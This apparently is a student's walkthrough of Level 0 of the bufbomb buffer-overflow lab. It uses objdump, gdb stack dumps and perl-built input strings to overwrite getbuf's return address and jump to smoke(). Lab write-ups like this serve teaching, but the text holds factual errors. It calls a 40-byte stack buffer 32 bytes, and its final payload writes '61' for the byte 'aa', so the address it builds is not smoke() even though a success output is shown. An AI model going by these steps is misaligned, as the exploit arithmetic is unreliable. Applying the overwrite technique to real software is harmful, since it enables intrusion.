Level 0
=======

Goal = provide a string longer than getbuf can handle causing an overflow and pushing the rest of the string onto the stack where you can then control where the function getbuf returns after exection.

Main Steps:

1. locate the address of the function ```smoke()```

   To find the address of function ```smoke()``` type:
   ```unix> objdump -d bufbomb | less```
 
   My address for ```smoke()``` = 080490aa <smoke>:

   <b>write down the address for ```smoke()``` as you will be using it later</b>


2. calculate the length of the string size to cause an overflow
   ```
   unix> gdb bufbomb
   (gdb) break getbuf
   (gdb) run -u quinnliu
   (gdb) break *getbuf+17
   (gdb) disas
   (gdb) info registers
   ```

   Gives you:

   ```
   (gdb) disas
   Dump of assembler code for function getbuf:
      0x08048c04 <+0>:     push   %ebp
      0x08048c05 <+1>:     mov    %esp,%ebp
      0x08048c07 <+3>:     sub    $0x38,%esp
   => 0x08048c0a <+6>:     lea    -0x28(%ebp),%eax
      0x08048c0d <+9>:     mov    %eax,(%esp)
      0x08048c10 <+12>:    call   0x8048b4a <Gets>
      0x08048c15 <+17>:    mov    $0x1,%eax
      0x08048c1a <+22>:    leave
      0x08048c1b <+23>:    ret
   End of assembler dump.
   (gdb) info registers
   eax            0x45789ae        72845742
   ecx            0x45789ae        72845742
   edx            0x3c1048 3936328
   ebx            0x0      0
   esp            0x55683318       0x55683318
   ebp            0x55683350       0x55683350
   esi            0x55686018       1432903704
   edi            0xc60    3168
   eip            0x8048c0a        0x8048c0a <getbuf+6>
   eflags         0x216    [ PF AF IF ]
   cs             0x23     35
   ss             0x2b     43
   ds             0x2b     43
   es             0x2b     43
   fs             0x0      0
   gs             0x63     99
   (gdb)
   ```

   Remember that the goal is to push a string that goes one address beyond the location of %ebp. 

   <b>write down %ebp address as you will be using it later. In my case:</b>

   %ebp = 0x55683350 

   getBuf() will take 32 characters. To modify the return address, we will need the buffer to extend to the address space right after %ebp on the stack or (%ebp)+4. So 32 bytes will be allocated to the buf variable for getbuf(). We need to look at the stack to determine the rest of the buffer size.

   Now quit out
   ```
   (gdb) q
   A debugging session is active.

           Inferior 1 [process 29088] will be killed.

   Quit anyway? (y or n) y
   ```

   Now create a test input file called "hex" and type a few commands
   ```
   unix> perl -e 'print "A"x32 '> hex
   unix> gdb bufbomb
   (gdb) break getbuf
   (gdb) break *getbuf+17
   (gdb) run -u quinnliu < hex
   (gdb) x/20x $esp
   (gdb) disas
   ```

   Gives you:

   ```
   (gdb) x/20x $esp
   0x55683318 <_reserved+1037080>: 0x55683330      0x00263b36      0x003c132c      0x55683328
   0x55683328 <_reserved+1037096>: 0x41723de3      0x00000000      0x55683350      0x08048b48
   0x55683338 <_reserved+1037112>: 0x00007399      0x5568338c      0x00000001      0x00000000
   0x55683348 <_reserved+1037128>: 0x55683370      0x003c0ff4      0x55683380      0x08048c93
   0x55683358 <_reserved+1037144>: 0x55683380      0x0027e610      0x55686018      0x00000c60
   (gdb) disas
   Dump of assembler code for function getbuf:
      0x08048c04 <+0>:     push   %ebp
      0x08048c05 <+1>:     mov    %esp,%ebp
      0x08048c07 <+3>:     sub    $0x38,%esp
   => 0x08048c0a <+6>:     lea    -0x28(%ebp),%eax
      0x08048c0d <+9>:     mov    %eax,(%esp)
      0x08048c10 <+12>:    call   0x8048b4a <Gets>
      0x08048c15 <+17>:    mov    $0x1,%eax
      0x08048c1a <+22>:    leave
      0x08048c1b <+23>:    ret
   End of assembler dump.
   ```

   Next type these commands:
   ```
   (gdb) continue
   (gdb) disas # notice that we are now at <+17>
   (gdb) x/20x $esp
   ```

   Gives you:
   ```
   (gdb) continue
   Continuing.

   Breakpoint 2, 0x08048c15 in getbuf ()
   (gdb) disas
   Dump of assembler code for function getbuf:
      0x08048c04 <+0>:     push   %ebp
      0x08048c05 <+1>:     mov    %esp,%ebp
      0x08048c07 <+3>:     sub    $0x38,%esp
      0x08048c0a <+6>:     lea    -0x28(%ebp),%eax
      0x08048c0d <+9>:     mov    %eax,(%esp)
      0x08048c10 <+12>:    call   0x8048b4a <Gets>
   => 0x08048c15 <+17>:    mov    $0x1,%eax
      0x08048c1a <+22>:    leave
      0x08048c1b <+23>:    ret
   End of assembler dump.
   (gdb) x/20x $esp
   0x55683318 <_reserved+1037080>: 0x55683328      0x00263b36      0x003c132c      0x55683328
   0x55683328 <_reserved+1037096>: 0x41414141      0x41414141      0x41414141      0x41414141
   0x55683338 <_reserved+1037112>: 0x41414141      0x41414141      0x41414141      0x41414141
   0x55683348 <_reserved+1037128>: 0x55683300      0x003c0ff4      0x55683380      0x08048c93
   0x55683358 <_reserved+1037144>: 0x55683380      0x0027e610      0x55686018      0x00000c60
   ```

   We can see that the "buf" variable stores its 32 byte string on the stack. Starting at address 0x55683328 and ending right before 0x55683348.

   startingAddressOfBufVariable = 0x55683328
   %ebp = 0x55683350 # I told you to write this down earlier

   buffer size = addressAt%ebp+4 - startingAddressOfBufVariable
               = 0x55683350   +4 - 0x55683328
               # make sure to use a hex calculator like this one: http://www.squarebox.com/legacy/hcalc.html
               = 2C # in hexadecimal = 44 bytes # in decimal

   We know that 32 bytes are used to store the "buf" variable as seen when we print out the registers after giving the "hex" file as input

   44 - 32 = 12 bytes left to fill the stack right before the return address(<= WHOLE POINT IS TO MANIPULATE THIS)

   Now quit out of gdb with ```q``` command and type:


3. create the buffer overflow string

   ```
   bash-4.1$ perl -e 'print "A"x32 ,"B"x4, "C"x4, "D"x4 '>hex2
   bash-4.1$ ls
   bufbomb  exploit.txt  hex  hex2  hex2raw  makecookie
   bash-4.1$ less hex2
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD

   Now use hex2 as your new input in gdb:
   ```
   unix> gdb bufbomb
   (gdb) break getbuf
   (gdb) break *getbuf+17
   (gdb) run -u quinnliu < hex2
   (gdb) x/20x $esp
   (gdb) continue
   (gdb) x/20x $esp 
   ```

   On the second call of ```(gdb) x/20x $esp``` you will see:

   ```
   (gdb) x/20x $esp
   0x55683318 <_reserved+1037080>: 0x55683328      0x00bafb36      0x00d0d32c       0x55683328
   0x55683328 <_reserved+1037096>: 0x41414141      0x41414141      0x41414141       0x41414141
   0x55683338 <_reserved+1037112>: 0x41414141      0x41414141      0x41414141       0x41414141
   0x55683348 <_reserved+1037128>: 0x42424242      0x43434343      0x44444444       0x08048c00
   0x55683358 <_reserved+1037144>: 0x55683380      0x00bca610      0x55686018       0x00000c60
   (gdb)
   ```

   Understand that our input file is:
   ```AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD```
   where A = 41, B = 42, C = 43, & D = 44

   So DDDD = 0x44444444

   After DDDD is 0x08048c00 <= THIS IS THE RETURN ADDRESS WE BE CHANGE the address of ```smoke()```!!!!!

4. force the function getbuf to return to fucntion ```smoke()``` instead of returning the value 1.

   Find where you wrote down the address of ```smoke()``` earlier. Mine is = 080490aa

   Because my machine is little endian the least significant byte is first.

   So 
   ```08 04 90 aa``` => ```aa 90 04 08```

   Now exit out of gdb:
   ```
   bash-4.1$ perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "61 90 04 08" '>hex3
   ```
   WHERE 61 = aa

   Now using the hex2raw executable file you can convert the hex3 text file into a raw file to be submitted as your answer to the bufferbomb.

   Type:
   ```./hex2raw < hex3 > raw```

5. Almost there!!!!!!!!!!

   Now actually give your "raw" file as input to the Buffer Bomb:
   ```./bufbomb -u quinnliu < raw```

   And you should get the following output:
   ```
   Userid: quinnliu 
   Cookie: 0x2d8cc70c
   Type string:Smoke!: You called smoke()
   VALID
   NICE JOB!
   ```